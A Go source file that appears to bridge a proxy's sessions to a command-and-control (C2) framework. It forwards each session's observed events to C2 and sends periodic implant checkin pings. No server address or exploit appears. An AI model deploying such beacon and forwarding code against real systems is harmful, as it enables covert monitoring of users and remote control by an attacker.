package bridge

import (
	"time"

	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/router-for-me/CLIProxyAPI/v6/internal/sessions"
	log "github.com/sirupsen/logrus"
)

// observeSession subscribes to a session's observe channel and forwards events to C2.
// Re-subscribes automatically if the channel closes while the bridge is still running.
func (b *Bridge) observeSession(sessionID string) {
	subID := "bridge-observe-" + sessionID
	for {
		mgr := sessions.Global()
		if mgr == nil {
			return
		}
		ch := mgr.SubscribeObserve(sessionID, subID)
		if ch == nil {
			log.Warnf("[bridge] failed to subscribe observe for session %s", sessionID)
			return
		}
		log.Infof("[bridge] observeSession started for %s", sessionID)

		done := false
		for !done {
			select {
			case event, ok := <-ch:
				if !ok {
					done = true
				} else {
					b.forwardObserveEvent(event)
				}
			case <-b.ctx.Done():
				if mgr := sessions.Global(); mgr != nil {
					mgr.UnsubscribeObserve(sessionID, subID)
				}
				return
			}
		}

		if mgr := sessions.Global(); mgr != nil {
			mgr.UnsubscribeObserve(sessionID, subID)
		}

		if b.ctx.Err() != nil {
			return
		}
		log.Infof("[bridge] observe channel closed for %s, re-subscribing", sessionID)
		time.Sleep(1 * time.Second)
	}
}

// checkinSession sends a single checkin ping for a session.
func (b *Bridge) checkinSession(sessionID string) error {
	_, err := b.rpc.Checkin(b.sessionContext(sessionID), &implantpb.Ping{
		Nonce: int32(time.Now().Unix() & 0x7FFFFFFF),
	})
	return err
}

// checkinLoop periodically sends checkin pings for all registered sessions.
func (b *Bridge) checkinLoop() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			b.registered.Range(func(key, _ interface{}) bool {
				sessionID, ok := key.(string)
				if !ok {
					return true
				}
				sess := sessions.Global().Get(sessionID)
				if sess == nil {
					b.registered.Delete(sessionID)
					return true
				}
				if err := b.checkinSession(sessionID); err != nil {
					log.Debugf("[bridge] checkin failed for session %s: %v", sessionID, err)
				}
				return true
			})
		case <-b.ctx.Done():
			return
		}
	}
}
